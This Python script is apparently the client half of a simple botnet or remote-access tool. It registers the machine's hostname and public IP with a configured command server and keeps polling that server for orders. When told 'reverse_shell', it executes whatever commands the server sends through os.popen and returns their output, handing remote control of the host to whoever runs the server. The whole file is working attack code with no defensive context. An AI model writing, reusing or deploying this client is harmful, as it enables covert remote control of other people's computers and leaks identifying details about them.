import json
import os
import datetime
from time import sleep
import socket
import hashlib
import socket
import sys
from requests import get

with open('client_config.json', 'r') as config_file:
    config = json.load(config_file)

public_ip = get('https://api.ipify.org').text

def process_protocol(client_hashed_id, action):
	return '{"client_hashed_id":"%s", "action":"%s"}' % (client_hashed_id, action)

def processHandshake():

	def _register_as_client(client_hashed_id):
		global public_ip
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((config['srvhost'], int(config['srvport'])))
		except socket.error:
			print("[i] Connection error. Server down?")
			return False
		s.send('{"client_hashed_id":"%s", "action":"%s", "hostname":"%s", "public_ip":"%s"}' % (client_hashed_id, "register", socket.gethostname(), public_ip))
		data = s.recv(1024)
		if data == "OK":
			os.system("echo -n '%s' >> client_hash_id.txt" % client_hashed_id)
			print("[S] Client successfully registered with id: %s" % client_hashed_id)
			return True
		else:
			print("[E] Error on register.")
			return False


	def _process_client_id():
		registered = False
		while registered == False:
			# Get the client id
			if os.path.exists('client_hash_id.txt'):
				with open('client_hash_id.txt', 'r') as client_hashed_id_file:
					client_hashed_id = client_hashed_id_file.read()
					client_hashed_id = client_hashed_id.rstrip()
					print("[i] Client already registered as %s" % client_hashed_id)
					registered = True
			else:
				print("[+] Registering as new client..")
				client_id_not_hashed = datetime.datetime.now()
				client_hashed_id = hashlib.md5(str(client_id_not_hashed)).hexdigest()
				registered = _register_as_client(client_hashed_id)

			if registered:
				return client_hashed_id
			else:
				print("[E] Error on register. Retrying in 30 seconds..")
				sleep(30)
				continue

	client_hashed_id = _process_client_id()
	return client_hashed_id


def checkForActions(client_hashed_id):
	while True:
		try:
			print('[i] Checking for actions..')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((config['srvhost'], int(config['srvport'])))
			s.send(process_protocol(client_hashed_id, "checkAction"))
			action = s.recv(1024)
			if action:
				if action == "reverse_shell":
					print("[S] Called for initialize a reverse shell..")
					initializeReverseShell(s)
					s.close()
					continue
				elif action == "NONE":
					print("[i] No action specified for this client. Checking again in 60 seconds.")
		except socket.error:
			print("[i] Connection error. Server down?")
		
		s.close()
		sleep(10)


def initializeReverseShell(s):
	while True:
		cmd = s.recv(1024)
		if cmd:
			if cmd == "exit":
				break
			else:
				print("[i] Executing %s" % cmd)
				result = os.popen(cmd).read()
				s.send(result)


def main():
	# Handshake with server
	checkForActions(processHandshake())

main()